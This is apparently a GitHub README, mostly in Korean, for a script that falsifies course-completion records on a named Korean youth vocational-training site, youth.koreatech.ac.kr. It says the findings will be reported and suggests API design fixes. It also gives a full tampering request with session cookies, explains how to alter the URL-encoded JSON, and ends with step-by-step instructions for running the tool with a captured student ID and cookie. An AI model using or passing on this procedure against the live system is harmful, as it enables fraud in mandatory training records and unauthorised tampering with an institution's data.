# Koreatech-study-script

Script for youth.koreatech.ac.kr lecture 

youth.koreatech.ac.kr 취약점 실태 및 스크립트

** 본 저장소에 있는 내용들은 해당 기관에 정식으로 보고할 예정입니다.

## Intro
 대한민국의 특성화고 재학생들은 [한국기술대학교 고용노동연수원](http://youth.koreatech.ac.kr) 에서 18시간의 직업 관련 기초 교육을 이수하도록 되어 있다. 
수업을 이수하던 중, 수강한 결과를 저장하는 API부분이 취약하다는 것을 발견하였다. 본 시스템은 수강 페이지 읽음의 여부, 문제풀이의 여부와 상관없이 단순한 접속시간만으로 수강 여부를 체크하고 있었고, 접속시간을 전송하는 부분조차 수강화면 종료시 접속시간을 서버에 전송하는 방식으로 누구든지 마음만 먹는다면 조작이 가능한 상황이었다. 

상세한 설명은 아래와 같다.

Sample Request)

~~~
GET /BookmarkLecture.do?cmd=addBookmarkNew&bookmarkJson=%7B%22accmConnPage%22%3A%22%22%2C%22aprvUserNm%22%3A%22%22%2C%22aprvUserNo%22%3A%22%22%2C%22atchFilePath%22%3A%22%22%2C%22banCd%22%3A%22%22%2C%22classStudyCnt%22%3A0%2C%22connCnt%22%3A1%2C%22connPageCnt%22%3A0%2C%22connTm%22%3A7%2C%22connTotTm%22%3A7%2C%22critTm%22%3A0%2C%22crsCreCd%22%3A%22%22%2C%22errorCode%22%3A%220%22%2C%22finalConnPage%22%3A%22%22%2C%22firstStudyDttm%22%3A%22%22%2C%22gradeCd%22%3A%22%22%2C%22groupTm%22%3A0%2C%22gubun%22%3A%22%22%2C%22hisSn%22%3A0%2C%22lastConnUintCd%22%3A%22%22%2C%22listParam%22%3A%22%22%2C%22maxScore%22%3A0%2C%22message%22%3A%22%22%2C%22messageDetail%22%3A%22%22%2C%22minScore%22%3A0%2C%22mobileTm%22%3A0%2C%22modDttm%22%3A%2220170905114849%22%2C%22modNm%22%3A%22UnKnown%22%2C%22modNo%22%3A%22%22%2C%22parUnitCd%22%3A%22%22%2C%22passScore%22%3A0%2C%22pcTm%22%3A0%2C%22prgrChkType%22%3A%22%22%2C%22prgrChkYn%22%3A%22%22%2C%22prgrRatio%22%3A0.46666666666666673%2C%22quiz%22%3A%22%22%2C%22quizCnt%22%3A0%2C%22quizPassScore%22%3A0%2C%22quizPassYn%22%3A%22%22%2C%22quizUnitCd%22%3A%22%22%2C%22quizYn%22%3A%22%22%2C%22rNum%22%3A%22%22%2C%22regDttm%22%3A%2220170905114849%22%2C%22regId%22%3A%22%22%2C%22regNm%22%3A%22UnKnown%22%2C%22regNo%22%3A%22%22%2C%22result%22%3A%22true%22%2C%22sbjCd%22%3A%22NSC0000519%22%2C%22schlStudyDivCd%22%3A%22%22%2C%22schlStudyDivNm%22%3A%22%22%2C%22schlStudyDt%22%3A%22%22%2C%22schlStudyEndTm%22%3A%22%22%2C%22schlStudyStartTm%22%3A%22%22%2C%22searchDuration%22%3A%22%22%2C%22searchFrom%22%3A%22%22%2C%22searchKey%22%3A%22%22%2C%22searchTo%22%3A%22%22%2C%22searchValue%22%3A%22%22%2C%22sortKey%22%3A%22%22%2C%22stdCnt%22%3A0%2C%22stdNo%22%3A%22EN0000699197%22%2C%22studyDiv%22%3A%22PER%22%2C%22studyDivNm%22%3A%22%22%2C%22studyDttm%22%3A%2220170905114849%22%2C%22studyYn%22%3A%22%22%2C%22subCnt%22%3A0%2C%22subList%22%3A%5B%5D%2C%22summaryRatio%22%3A0%2C%22todayStudyYn%22%3A%22%22%2C%22totPageCnt%22%3A0%2C%22totalConnect%22%3A0%2C%22totalConnectTime%22%3A0%2C%22totalPage%22%3A0%2C%22unitCd%22%3A%22CNT000001349%22%2C%22unitFilePath%22%3A%22%22%2C%22unitLvl%22%3A0%2C%22unitNm%22%3A%22%22%2C%22unitOdr%22%3A0%2C%22unitPath%22%3A%22%22%2C%22unitType%22%3A%22%22%2C%22userId%22%3A%22%22%2C%22userNm%22%3A%22%22%2C%22userNo%22%3A%22%22%7D HTTP/1.1
Host: youth.koreatech.ac.kr
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=Ms0L786judVYpsXgHM1uM6Gpkacn2RHdwJEvVudUPa3oLVj2908z6GMLN5TlP27f.WAS2_servlet_engine3; __smVisitorID=PTmNWrNjSgx; _TRK_EX=24; _TRK_SID=b29f2ed5778e66687400438b62908e1f; _BS_GUUID=EPue78dXBQeRRcfuNPL9ey1ZT585mu11kwgrEtof; _TRK_UID=ea035a043cbbf862fe790bf902e0188e:1:0:1504577643434
Connection: close
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8
Referer: http://youth.koreatech.ac.kr/jsp/bookmark/study_edutrack_adapter.jsp
Accept-Language: ko-kr
X-Requested-With: XMLHttpRequest

~~~

위의 요청에서 'bookmarkJson'에 해당하는 데이터가 수업을 저장하는 데이터이며, url decode를 해보면 아래와 같다.

~~~
{ "accmConnPage": "", "aprvUserNm": "", "aprvUserNo": "", "atchFilePath": "", "banCd": "", "classStudyCnt": 1, "connCnt": 1, "connPageCnt": 1, "connTm": 1684, "connTotTm": 9, "critTm": 0, "crsCreCd": "", "errorCode": "0", "finalConnPage": "", "firstStudyDttm": "", "gradeCd": "", "groupTm": 0, "gubun": "", "hisSn": 0, "lastConnUintCd": "", "listParam": "", "maxScore": 0, "message": "", "messageDetail": "", "minScore": 0, "mobileTm": 0, "modDttm": "20170905114824", "modNm": "UnKnown", "modNo": "", "parUnitCd": "", "passScore": 0, "pcTm": 0, "prgrChkType": "", "prgrChkYn": "", "prgrRatio": 0.6, "quiz": "", "quizCnt": 0, "quizPassScore": 0, "quizPassYn": "", "quizUnitCd": "", "quizYn": "", "rNum": "", "regDttm": "20170905114824", "regId": "", "regNm": "UnKnown", "regNo": "", "result": "true", "sbjCd": "NSC0000519", "schlStudyDivCd": "", "schlStudyDivNm": "", "schlStudyDt": "", "schlStudyEndTm": "", "schlStudyStartTm": "", "searchDuration": "", "searchFrom": "", "searchKey": "", "searchTo": "", "searchValue": "", "sortKey": "", "stdCnt": 0, "stdNo": "", "studyDiv": "PER", "studyDivNm": "", "studyDttm": "20170905114824", "studyYn": "", "subCnt": 0, "subList": [], "summaryRatio": 0, "todayStudyYn": "", "totPageCnt": 0, "totalConnect": 0, "totalConnectTime": 0, "totalPage": 0, "unitCd": "CNT000001355", "unitFilePath": "", "unitLvl": 0, "unitNm": "", "unitOdr": 0, "unitPath": "", "unitType": "", "userId": "", "userNm": "", "userNo": "" };
~~~

위의 JSON데이터를 약간만 수정하여 HTTP 요청을 보내게 되면, 누구든지 수업 이수 데이터를 조작할 수 있게 된다. 이러한 방식으로는 본 저장소에 있는 스크립트와 같이 간단한 코드 혹은, Burpsuite같은 프록시 도구만으로도 데이터 조작이 가능하다.

 따라서, 아래와 같은 방식을 제안하는 바이다. 

![UserFlow](./images/CheckingFlow.png)

## Comments
 위의 취약점과 더불어, youth.koreatech.ac.kr는 심각한 설계상의 문제가 있는 것으로 보인다. 

~~~
/BookmarkLecture.do?cmd=addBookmarkNew&bookmarkJson= ...
~~~ 
와 같이 API를 url로 구분하지 않고, 메서드를 사용하듯 하나의 경로에 'cmd' 변수에 수행할 작업을 명시적으로 적어주고 있다. 또한 분명히 데이터를 조작하는 경우이고, JSON 데이터를 서버측으로 보내는 요청임에도 불구하고, GET 메서드를 통해 url에 JSON데이터를 넘기고 있다. 심지어 해싱 등의 작업도 없이 평문그대로를 url에 포함시켜 전송하고 있다. 

또한, 본 저장소에서는 드러나지 않았지만, 로그인 시에도 해싱 없이 평문 그대로를 서버에 전송하고 있음을 확인할 수 있다. 

~~~
POST /UserYouth.do

cmd=login&goMcd=&loginDTO.userPass=*user_password*&loginDTO.userId=*user_ID*
~~~

REST API 설계시에 반드시 지켜야하는 규칙이 존재하는것은 아니지만, 아래와 같은 가이드라인을 준수하면 유지보수, 운영 측면에서 더 효율적이지 않을까 싶다.

* CRUD 작업에 따라 HTTP 메서드를 구분한다.

    * POST : Create

    * GET : Read

    * PUT : Update

    * DELETE : Delete

* URL에 동사보다는 명사를 사용한다.

* 명시적으로 메서드 이름을 지정하는 것보다는 HTTP Method + URL로 나타낸다.

ex) 
HTTP GET : 

/BookmarkLecture.do?cmd=addBookmarkNew

=>

HTTP PUT:

/:userID/bookmarks/:classID


## How to use

 1. clone this repo

 2. install dependency 

 ~~~
 npm install
 ~~~

 3. Get student id & cookie by burpsuite or other proxy tools. We recommend [Fiddler](http://www.telerik.com/fiddler) for this task.

 4. Run & Insert student info, cookie

 ~~~
 > node app.js
 > What is stdNO? EN0001999 
 > What is your cookie? BS_GUUID=LddzZixdjlaxxEaGZvdxZC9nuzBHyeSks5UrorFI; _TRK_UID=301f18fa8f17c1b28f46e50578a65395:1:0:1504585909071; _TRK_CR=http%3A%2F%2Fyouth.koreatech.ac.kr%2FMainYouth.do%3Fcmd=indexMain; _TRK_CQ=%3Fcmd=listCourseIng; __smVisitorID=RgpBBgH4Z4e; JSESSIONID=TajL13cE9uOGsBsslEcG1YdP5qfa1wstwMHcy0eZPEGpEgad92N9ifHfqUIouoaR.WAS2_servlet_engine3; _TRK_EX=11; _TRK_SID=8698f15b3b04ad08298dfdsffsdfdf0c940

 ~~~

## Contributors

#### Script development & API Analyze

+ 박재성([pRivAte12](https://github.com/pRivAte12))

#### Packet analyst

+ 손명준([YuHyun7](https://github.com/YuHyun7), Initial Observation)
+ 조준오([herojeff02](https://github.com/herojeff02), Substraction Examination)
+ 박영훈([dudgns0507](https://github.com/dudgns0507), Overall Analysis)
